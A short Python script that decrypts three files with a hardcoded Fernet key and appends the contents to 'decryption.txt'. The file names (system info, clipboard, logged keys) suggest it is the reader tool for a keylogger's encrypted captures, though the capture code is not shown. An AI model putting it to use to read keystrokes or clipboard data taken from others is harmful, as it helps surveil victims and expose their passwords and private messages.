from cryptography.fernet import Fernet

# Replace this with your actual encryption key
key = "SLuuVhzW238qkC_MMmTuG9jGACRVH6DkrV0Pg0ASo_Q="

# List of encrypted files
encrypted_files = ['e_system.txt', 'e_clipboard.txt', 'e_keys_logged.txt']

# Initialize Fernet with the provided key
fernet = Fernet(key)

for encrypted_file in encrypted_files:
    try:
        # Read the encrypted data
        with open(encrypted_file, 'rb') as f:
            encrypted_data = f.read()

        # Decrypt the data
        decrypted_data = fernet.decrypt(encrypted_data)

        # Append the decrypted data to the decryption.txt file
        with open("decryption.txt", 'ab') as f:
            f.write(decrypted_data)

    except Exception as e:
        print(f"Failed to decrypt {encrypted_file}: {e}")
